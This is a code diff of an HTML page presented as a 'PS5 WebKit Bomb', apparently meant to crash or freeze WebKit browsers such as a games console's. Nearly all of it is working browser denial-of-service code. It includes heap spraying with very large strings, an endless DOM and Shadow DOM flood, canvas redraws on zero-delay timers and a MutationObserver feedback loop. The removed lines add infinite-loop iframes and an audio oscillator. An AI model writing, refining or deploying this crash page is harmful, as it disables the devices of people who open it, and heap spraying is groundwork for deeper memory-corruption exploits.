@@ -1,98 +1,85 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Destructive WebKit Fuzzer</title>
+  <title>PS5 WebKit Bomb</title>
   <style>
     body {
       background: black;
       color: lime;
       font-family: monospace;
+      overflow: hidden;
     }
     .boom {
-      animation: explode 0.05s infinite alternate;
+      animation: scaleup 0.05s infinite alternate;
+      will-change: transform;
     }
-    @keyframes explode {
+    @keyframes scaleup {
       0% { transform: scale(1); }
-      100% { transform: scale(10); }
+      100% { transform: scale(5); }
     }
   </style>
 </head>
 <body>
-  <h1>⚠️ WebKit Crash Bomb Loaded...</h1>
-  <pre id="log">[+] Launching chaos...</pre>
+  <pre id="log">[+] PS5 WebKit Crash Bomb Loaded...</pre>
 
   <script>
     const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-    // 1. Heap spraying with massive strings
+    // 1. Heap spray con strings
     const spray = [];
     try {
-      for (let i = 0; i < 100000; i++) {
-        spray.push("A".repeat(100000));
-        if (i % 1000 === 0) log(`[+] Spray ${i}`);
+      for (let i = 0; i < 200000; i++) {
+        spray.push("💥".repeat(1000));
+        if (i % 1000 === 0) log(`[+] Heap spray ${i}`);
       }
     } catch (e) {
-      log("[!] Heap spray exception: " + e);
+      log("[!] Heap spray error: " + e);
     }
 
-    // 2. Canvas flooding
-    for (let i = 0; i < 10; i++) {
+    // 2. DOM mass spam + Shadow DOM abuse
+    function domFlood() {
+      for (let i = 0; i < 100; i++) {
+        const host = document.createElement("div");
+        host.className = "boom";
+        host.style.color = "#0f0";
+        host.textContent = "💣".repeat(100);
+        document.body.appendChild(host);
+
+        const shadow = host.attachShadow({ mode: "open" });
+        const inner = document.createElement("span");
+        inner.textContent = "🧨".repeat(50);
+        shadow.appendChild(inner);
+      }
+      requestAnimationFrame(domFlood);
+    }
+
+    // 3. Canvas stress (solo si soportado)
+    for (let i = 0; i < 3; i++) {
       const canvas = document.createElement("canvas");
-      canvas.width = canvas.height = 10000;
-      document.body.appendChild(canvas);
+      canvas.width = canvas.height = 4096;
       const ctx = canvas.getContext("2d");
+      document.body.appendChild(canvas);
       setInterval(() => {
-        ctx.fillStyle = "#" + Math.floor(Math.random()*0xFFFFFF).toString(16);
-        ctx.fillRect(Math.random()*1e4, Math.random()*1e4, 500, 500);
+        ctx.fillStyle = "#" + Math.floor(Math.random() * 0xffffff).toString(16);
+        ctx.fillRect(Math.random()*4096, Math.random()*4096, 1024, 1024);
       }, 0);
     }
 
-    // 3. Audio stress
-    try {
-      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-      const osc = audioCtx.createOscillator();
-      osc.frequency.value = 99999;
-      osc.connect(audioCtx.destination);
-      osc.start();
-    } catch (e) {
-      log("[!] AudioContext error: " + e);
-    }
-
-    // 4. DOM mutation spam + ShadowDOM
-    function spawnNodes() {
-      for (let i = 0; i < 100; i++) {
-        const el = document.createElement("div");
-        el.className = "boom";
-        const shadow = el.attachShadow({ mode: "open" });
-        for (let j = 0; j < 50; j++) {
-          const span = document.createElement("span");
-          span.textContent = "💥";
-          shadow.appendChild(span);
-        }
-        document.body.appendChild(el);
+    // 4. Mutation Observer para trigger loops
+    const obs = new MutationObserver(() => {
+      if (Math.random() < 0.5) {
+        const n = document.createElement("div");
+        n.textContent = "🔁" + "X".repeat(5000);
+        document.body.appendChild(n);
       }
-      requestAnimationFrame(spawnNodes);
-    }
-
-    // 5. Iframes in loop
-    function floodIframes() {
-      for (let i = 0; i < 20; i++) {
-        const iframe = document.createElement("iframe");
-        iframe.srcdoc = "<script>while(true){}</script>";
-        document.body.appendChild(iframe);
-      }
-      setTimeout(floodIframes, 100);
-    }
-
-    // 6. Mutation observer triggers DOM wipes
-    const observer = new MutationObserver(() => {
-      if (Math.random() < 0.2) document.body.innerHTML += "<div>" + "X".repeat(10000) + "</div>";
     });
-    observer.observe(document.body, { childList: true, subtree: true });
+    obs.observe(document.body, { childList: true, subtree: true });
 
-    // Launch all
-    spawnNodes();
-    floodIframes();
+    // Ejecutar bomba
+    setTimeout(() => {
+      log("[+] Starting DOM flood...");
+      domFlood();
+    }, 100);
   </script>
 </body>
 </html>
